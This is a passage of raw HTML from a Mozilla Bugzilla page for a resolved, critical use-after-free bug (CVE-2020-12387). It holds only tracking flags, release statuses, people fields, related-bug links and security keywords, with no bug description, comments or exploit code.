quot;wontfix&quot;,&quot;cf_tracking_firefox69&quot;:&quot;+&quot;,&quot;cf_status_firefox_esr68&quot;:&quot;fixed&quot;,&quot;cf_status_firefox69&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox75&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox75&quot;:&quot;+&quot;,&quot;cf_tracking_firefox73&quot;:&quot;+&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox73&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox70&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox68&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox74&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;cf_tracking_thunderbird_esr91&quot;:&quot;---&quot;,&quot;cf_tracking_firefox72&quot;:&quot;+&quot;,&quot;cf_tracking_firefox76&quot;:&quot;+&quot;,&quot;dupe_of&quot;:null,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr78&quot;:&quot;---&quot;}"></span>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-tracking-content"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-status-view"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-view-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-view">RESOLVED
        FIXED
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status-edit" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugStatuses" id="status-edit-help-link" class="help">Status:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-status-edit"><div class="field inline" id="field-bug_status"
>


  
    <div class="value">
        <span id="field-value-bug_status">
            RESOLVED

        </span>
    </div>

  
</div><div class="field indent inline" id="field-resolution"
>


  
    <div class="value">
        <span id="field-value-resolution">
            FIXED

        </span>
    </div>

  
</div>
  <div id="status-action-buttons">
      <div id="assigned-container" style="display:none">
        <button type="button" class="secondary" id="mark-as-assigned-btn">
          Mark as Assigned
        </button>
      </div>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-target_milestone"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone" id="target_milestone-help-link" class="help">Milestone:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-target_milestone">
            mozilla76

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_iteration" style="display:none"
>
    <div class="name">Iteration:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_iteration">
            ---

        </span>
    </div>

  
</div>


      <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Project Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <td class="tracking-flag-name">Root Cause</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_root_cause-dirty">
  <select id="cf_root_cause" name="cf_root_cause">
        <option value="---"
          id="v4701_cf_root_cause" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Webcompat Priority</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_webcompat_priority-dirty">
  <select id="cf_webcompat_priority" name="cf_webcompat_priority">
        <option value="---"
          id="v4274_cf_webcompat_priority" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">a11y-review</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_a11y_review_project_flag-dirty">
  <select id="cf_a11y_review_project_flag" name="cf_a11y_review_project_flag">
        <option value="---"
          id="v4876_cf_a11y_review_project_flag" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">user-doc-firefox</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_sumo-dirty">
  <select id="cf_tracking_firefox_sumo" name="cf_tracking_firefox_sumo">
        <option value="---"
          id="v4660_cf_tracking_firefox_sumo" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">Fission Milestone</td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_fission_milestone-dirty">
  <select id="cf_fission_milestone" name="cf_fission_milestone">
        <option value="---"
          id="v4222_cf_fission_milestone" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

      <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags" id="-help-link" class="help">Tracking Flags:
        </a>
    </div>


  
    <div class=" container"><div class="flags edit-hide">
    <table class="layout-table tracking-flags">
        <tr>
          <th></th>
          <th>Tracking</th>
          <th>Status</th>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox-esr68</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox_esr68&amp;o1=equals&amp;v1=76%2B">76+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox_esr68&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox68</td>
            <td class="tracking-flag-tracking">---
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox68&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox69</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox69&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox69&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox70</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox70&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox70&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox71</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox71&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox71&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox72</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox72&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox72&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox73</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox73&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox73&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox74</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox74&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox74&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox75</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox75&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox75&amp;o1=equals&amp;v1=wontfix">wontfix</a>
          </td>
        </tr>
        <tr>
          <td class="tracking-flag-name">firefox76</td>
            <td class="tracking-flag-tracking">
                <a href="/buglist.cgi?f1=cf_tracking_firefox76&amp;o1=equals&amp;v1=%2B">+</a>
            </td>
          <td class="tracking-flag-status">
              <a href="/buglist.cgi?f1=cf_status_firefox76&amp;o1=equals&amp;v1=fixed">fixed</a>
          </td>
        </tr>
    </table>
  </div>


<div class="flags edit-show" style="display:none">
  <table class="layout-table tracking-flags">
      <tr>
        <th></th>
        <th>Tracking</th>
        <th>Status</th>
      </tr>
      <tr>
        <td class="tracking-flag-name">relnote-firefox</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_tracking_firefox_relnote-dirty">
  <select id="cf_tracking_firefox_relnote" name="cf_tracking_firefox_relnote">
        <option value="---"
          id="v539_cf_tracking_firefox_relnote" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr78-dirty">
  <select id="cf_tracking_thunderbird_esr78" name="cf_tracking_thunderbird_esr78">
        <option value="---"
          id="v4823_cf_tracking_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr78-dirty">
  <select id="cf_status_thunderbird_esr78" name="cf_status_thunderbird_esr78">
        <option value="---"
          id="v4829_cf_status_thunderbird_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird_esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_esr91-dirty">
  <select id="cf_tracking_thunderbird_esr91" name="cf_tracking_thunderbird_esr91">
        <option value="---"
          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr68</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr68-dirty">
  <select id="cf_tracking_firefox_esr68" name="cf_tracking_firefox_esr68">
        <option value="76+"
          id="v4686_cf_tracking_firefox_esr68" selected
        >76+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr68-dirty">
  <select id="cf_status_firefox_esr68" name="cf_status_firefox_esr68">
        <option value="fixed"
          id="v4412_cf_status_firefox_esr68" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr78</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr78-dirty">
  <select id="cf_tracking_firefox_esr78" name="cf_tracking_firefox_esr78">
        <option value="---"
          id="v4808_cf_tracking_firefox_esr78" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr78-dirty">
  <select id="cf_status_firefox_esr78" name="cf_status_firefox_esr78">
        <option value="---"
          id="v4813_cf_status_firefox_esr78" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox-esr91</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox_esr91-dirty">
  <select id="cf_tracking_firefox_esr91" name="cf_tracking_firefox_esr91">
        <option value="---"
          id="v5194_cf_tracking_firefox_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox_esr91-dirty">
  <select id="cf_status_firefox_esr91" name="cf_status_firefox_esr91">
        <option value="---"
          id="v5199_cf_status_firefox_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox68</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox68-dirty">
  <select id="cf_status_firefox68" name="cf_status_firefox68">
        <option value="wontfix"
          id="v4261_cf_status_firefox68" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox69</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox69-dirty">
  <select id="cf_tracking_firefox69" name="cf_tracking_firefox69">
        <option value="+"
          id="v4323_cf_tracking_firefox69" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox69-dirty">
  <select id="cf_status_firefox69" name="cf_status_firefox69">
        <option value="wontfix"
          id="v4332_cf_status_firefox69" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox70</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox70-dirty">
  <select id="cf_tracking_firefox70" name="cf_tracking_firefox70">
        <option value="+"
          id="v4429_cf_tracking_firefox70" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox70-dirty">
  <select id="cf_status_firefox70" name="cf_status_firefox70">
        <option value="wontfix"
          id="v4438_cf_status_firefox70" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox71</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox71-dirty">
  <select id="cf_tracking_firefox71" name="cf_tracking_firefox71">
        <option value="+"
          id="v4457_cf_tracking_firefox71" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox71-dirty">
  <select id="cf_status_firefox71" name="cf_status_firefox71">
        <option value="wontfix"
          id="v4466_cf_status_firefox71" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox72</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox72-dirty">
  <select id="cf_tracking_firefox72" name="cf_tracking_firefox72">
        <option value="+"
          id="v4512_cf_tracking_firefox72" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox72-dirty">
  <select id="cf_status_firefox72" name="cf_status_firefox72">
        <option value="wontfix"
          id="v4506_cf_status_firefox72" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox73</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox73-dirty">
  <select id="cf_tracking_firefox73" name="cf_tracking_firefox73">
        <option value="+"
          id="v4540_cf_tracking_firefox73" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox73-dirty">
  <select id="cf_status_firefox73" name="cf_status_firefox73">
        <option value="wontfix"
          id="v4549_cf_status_firefox73" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox74</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox74-dirty">
  <select id="cf_tracking_firefox74" name="cf_tracking_firefox74">
        <option value="+"
          id="v4565_cf_tracking_firefox74" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox74-dirty">
  <select id="cf_status_firefox74" name="cf_status_firefox74">
        <option value="wontfix"
          id="v4574_cf_status_firefox74" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox75</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox75-dirty">
  <select id="cf_tracking_firefox75" name="cf_tracking_firefox75">
        <option value="+"
          id="v4641_cf_tracking_firefox75" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox75-dirty">
  <select id="cf_status_firefox75" name="cf_status_firefox75">
        <option value="wontfix"
          id="v4635_cf_status_firefox75" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox76</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox76-dirty">
  <select id="cf_tracking_firefox76" name="cf_tracking_firefox76">
        <option value="+"
          id="v4683_cf_tracking_firefox76" selected
        >+
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox76-dirty">
  <select id="cf_status_firefox76" name="cf_status_firefox76">
        <option value="fixed"
          id="v4676_cf_status_firefox76" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox93-dirty">
  <select id="cf_tracking_firefox93" name="cf_tracking_firefox93">
        <option value="---"
          id="v5266_cf_tracking_firefox93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox93-dirty">
  <select id="cf_status_firefox93" name="cf_status_firefox93">
        <option value="---"
          id="v5271_cf_status_firefox93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox94-dirty">
  <select id="cf_tracking_firefox94" name="cf_tracking_firefox94">
        <option value="---"
          id="v5284_cf_tracking_firefox94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox94-dirty">
  <select id="cf_status_firefox94" name="cf_status_firefox94">
        <option value="---"
          id="v5289_cf_status_firefox94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">firefox95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_firefox95-dirty">
  <select id="cf_tracking_firefox95" name="cf_tracking_firefox95">
        <option value="---"
          id="v5311_cf_tracking_firefox95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_firefox95-dirty">
  <select id="cf_status_firefox95" name="cf_status_firefox95">
        <option value="---"
          id="v5316_cf_status_firefox95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: loobenyang, Assigned: asuth)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_151407" ><img src="https://secure.gravatar.com/avatar/75b1e0d00a677e73b24efe34917fa1e9?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=151407" > <span class="fna">asuth</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_506912" ><img src="https://secure.gravatar.com/avatar/387b65e77a270f67cd03547039f6b2eb?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=506912" > <span class="fna">loobenyang</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field" id="field-triage_owner"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            <div class="vcard vcard_646284" ><img src="https://secure.gravatar.com/avatar/9dcff4a8838b41f34d204c2f4cadbcc4?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=646284" > <span class="fna">jstutte</span></a>
</div>

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="20">20 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Assertion failure: !mProxy-&gt;mSyncLoopTarget, at src/dom/xhr/XMLHttpRequestWorker.cpp:1416"
   href="/show_bug.cgi?id=1588248">1588248</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1545345&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1545345">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates" id="-help-link" class="help">Duplicates:
        </a>
    </div>


  
    <div class="value">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1547059">1547059</a>
      </div>

    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_file_loc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="" target="_blank"
      rel="noreferrer" title=""
      class="bug-url" data-safe="0"></a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-see_also"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - Assertion failure: js::GetNonCCWObjectRealm(wrapper) == js::GetContextRealm(cx), at /builds/worker/workspace/build/src/dom/workers/WorkerRunnable.cpp:345"
   href="/show_bug.cgi?id=1557732">1557732</a>
      </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: csectype-uaf, sec-critical, Whiteboard: [post-critsmash-triage][adv-main76+][adv-ESR68.8+])
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2020-12387

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=csectype-uaf&amp;resolution=---">csectype-uaf</a>, 
          <a href="/buglist.cgi?keywords=sec-critical&amp;resolution=---">sec-critical</a>
        </span>
    </div>

  
</div>

    <div class="field" id="field-status_whiteboard"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">[post-critsmash-triage][adv-main76+][adv-ESR68.8+]
        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_qa_whiteboard" style="display:none"
>
    <div class="name">QA Whiteboard:
    </div>


  
    <div class="value">
        <span id="field-value-cf_qa_whiteboard">
        ---
        </span>
    </div>

  
</div>

    

    <div class="field edit-show" id="field-cf_has_regression_range" style="display:none"
>
    <div class="name">Has Regression Range:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_regression_range">
            ---

        </span>
    </div>

  
</div><div class="field edit-show" id="field-cf_has_str" style="display:none"
>
    <div class="name">Has STR:
    </div>


  
    <div class="value">
        <span id="field-value-cf_has_str">
            ---

        </span>
    </div>

  
</div>

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_flags"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
          <tbody class="edit-hide"><tr>
    <td class="flag-setter"><div class="vcard vcard_1689" ><a class="email " href="/user_profile?user_id=1689" > <span class="fna">dveditz</span></a>
</div>
    </td>

    <td class="flag-name">
        <a href="#a10066826_1689"
            class="rel-time-title activity-ref"
            title="3 years ago"
        data-time="1555567423"
      >sec-bounty</a>
